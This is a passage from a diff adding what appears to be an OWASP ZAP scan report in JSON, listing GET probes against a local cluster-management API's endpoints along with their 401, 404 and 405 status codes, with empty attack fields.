+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id/metrics/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id\/metrics\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "695",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/tasks",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/tasks",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8552",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/tasks/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/tasks\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "124",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/tasks/2015138671305308526",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/tasks\/2015138671305308526",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "106",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/tasks/task_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/tasks\/task_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8556",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/tasks/task_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/tasks\/task_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "15",
+							"uri": "http://host.docker.internal:8000/api/clusters",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8563",
+							"uri": "http://host.docker.internal:8000/api/clusters/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "125",
+							"uri": "http://host.docker.internal:8000/api/clusters/1998985588996966221",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/1998985588996966221",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "17",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8570",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "126",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/8582658679160187825",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/8582658679160187825",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "705",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8568",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "127",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/314502252463990002",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/314502252463990002",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "42",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8566",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "128",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/6961104764672105378",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/6961104764672105378",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "711",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "8577",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "129",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP/6780031460568976476",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP\/6780031460568976476",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "45",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP/config",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP\/config",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8573",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP/config/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP\/config\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "44",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP/status",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP\/status",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8580",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP/status/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP\/status\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "50",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/plugins",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/plugins",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8587",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/plugins/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/plugins\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "37",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/consumer-groups",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/consumer-groups",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8588",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/consumer-groups/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/consumer-groups\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "130",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/consumer-groups/8196393522000923287",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/consumer-groups\/8196393522000923287",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "38",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/consumer-groups/group_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/consumer-groups\/group_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8578",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/consumer-groups/group_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/consumer-groups\/group_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "717",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/deploy",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/deploy",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "8584",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/deploy/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/deploy\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "131",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/deploy/3175602091240746696",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/deploy\/3175602091240746696",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "20",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/deploy/task_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/deploy\/task_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8586",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/deploy/task_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/deploy\/task_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "723",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8589",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "132",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/8559866176455661741",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/8559866176455661741",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "66",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/entities",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/entities",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8591",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/entities/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/entities\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "730",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/history",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/history",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "68",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/history?limit=50&offset=0",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/history (limit,offset)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8598",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/history/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/history\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "133",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/history/9197864153127951203",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/history\/9197864153127951203",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "61",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/status",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/status",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8600",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/status/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/status\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "735",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/stream",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/stream",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8593",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/stream/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/stream\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "134",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/stream/2489718447373265210",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/stream\/2489718447373265210",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "741",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/stream/stream_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/stream\/stream_id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8602",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/stream/stream_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/stream\/stream_id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "135",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/stream/stream_id/3574523625593414740",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/stream\/stream_id\/3574523625593414740",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "64",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/stream/stream_id/poll",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/stream\/stream_id\/poll",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8606",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/stream/stream_id/poll/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/stream\/stream_id\/poll\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "747",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/terminate",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/terminate",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8603",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/terminate/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/terminate\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "136",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/ksqldb/terminate/6462375575205097806",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/ksqldb\/terminate\/6462375575205097806",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "8608",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/logs",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/logs",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "71",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/logs?service_id=service_id&role=role&lines=200&since=since&priority=priority&grep=grep",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/logs (grep,lines,priority,role,service_id,since)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8610",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/logs/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/logs\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "754",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8607",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "137",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/2888427732882353658",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/2888427732882353658",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "766",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "55",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls?principal=&resource_type=&resource_name=",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls (principal,resource_name,resource_type)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8615",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "138",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/1776413827909324792",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/1776413827909324792",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "773",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/principal",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/principal",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8612",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/principal/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/principal\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "139",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/principal/4288125782407448039",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/principal\/4288125782407448039",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "59",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/principal/principal",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/principal\/principal",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8617",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/principal/principal/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/principal\/principal\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "781",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/topic",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/topic",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8618",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/topic/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/topic\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "140",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/topic/8345181909679388059",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/topic\/8345181909679388059",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "58",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/topic/topic_name",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/topic\/topic_name",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8623",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/acls/topic/topic_name/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/acls\/topic\/topic_name\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8620",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/audit-log",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/audit-log",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "60",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/audit-log?limit=50&offset=0&action=",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/audit-log (action,limit,offset)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8625",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/audit-log/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/audit-log\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "51",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/users",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/users",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8629",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/users/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/users\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "141",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/users/3606442979710227780",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/users\/3606442979710227780",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "791",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/users/username",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/users\/username",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "8630",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/users/username/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/users\/username\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "142",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/users/username/6576983352693494503",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/users\/username\/6576983352693494503",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "799",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "8633",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "143",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services/867006591239540618",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services\/867006591239540618",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "26",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/status",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/status",
